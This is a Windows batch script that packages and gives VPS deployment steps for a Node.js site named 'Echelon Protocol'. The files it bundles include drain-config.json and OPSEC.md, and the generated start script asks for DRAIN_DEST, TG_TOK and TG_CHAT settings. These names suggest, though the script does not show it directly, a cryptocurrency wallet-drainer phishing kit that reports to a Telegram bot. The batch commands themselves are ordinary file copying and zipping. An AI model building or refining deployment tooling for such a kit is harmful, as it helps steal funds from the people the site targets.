@echo off

echo.
echo  ECHELON PROTOCOL - AUTO DEPLOY BUILDER v2.0
echo.

set SITE_DIR=%~dp0site
set DEPLOY_DIR=%~dp0deploy
set ZIP_NAME=echelon-deploy.zip

if not exist "%SITE_DIR%" (
    echo [ERROR] site\ folder not found
    pause
    exit /b 1
)

echo [1/5] Cleaning deploy folder...
if exist "%DEPLOY_DIR%" rmdir /s /q "%DEPLOY_DIR%"
mkdir "%DEPLOY_DIR%"
mkdir "%DEPLOY_DIR%\public"

echo [2/5] Copying site files...
xcopy /s /i /y "%SITE_DIR%\public\*" "%DEPLOY_DIR%\public\" >nul
copy "%SITE_DIR%\serve.js"     "%DEPLOY_DIR%\" >nul
copy "%SITE_DIR%\package.json"  "%DEPLOY_DIR%\" >nul
copy "%SITE_DIR%\.env.example" "%DEPLOY_DIR%\" >nul
copy "%SITE_DIR%\README.md"    "%DEPLOY_DIR%\" >nul
copy "%SITE_DIR%\OPSEC.md"    "%DEPLOY_DIR%\" >nul

echo [3/5] Copying optional config...
if exist "%SITE_DIR%\.env" copy "%SITE_DIR%\.env" "%DEPLOY_DIR%\.env" >nul
if exist "%SITE_DIR%\drain-config.json" copy "%SITE_DIR%\drain-config.json" "%DEPLOY_DIR%\" >nul

echo [4/5] Creating start scripts...
(
echo #!/bin/bash
echo cd "$(dirname "$0")"
echo npm install --omit=dev
echo cp .env.example .env 2^>/dev/null
echo echo "Edit .env with real DRAIN_DEST, TG_TOK, TG_CHAT"
echo echo "Starting Echelon Protocol..."
echo node serve.js
) > "%DEPLOY_DIR%\start.sh"

echo [5/5] Compressing...
powershell -Command "Compress-Archive -Path '%DEPLOY_DIR%\*' -DestinationPath '%DEPLOY_DIR%\%ZIP_NAME%' -Force"

echo.
echo  Done.
echo.
echo  Deploy to VPS:
echo   1. Upload:  scp deploy/echelon-deploy.zip user@vps:/home/user/
echo   2. SSH in:  ssh user@vps
echo   3. Extract: unzip echelon-deploy.zip -d echelon
echo   4. Config:  cd echelon ^&^& cp .env.example .env ^&^& nano .env
echo   5. Start:   npm install ^&^& node serve.js
echo      Or PM2: pm2 start serve.js --name echelon
echo.
echo  Files in deploy\:
dir /b "%DEPLOY_DIR%"
echo.
pause
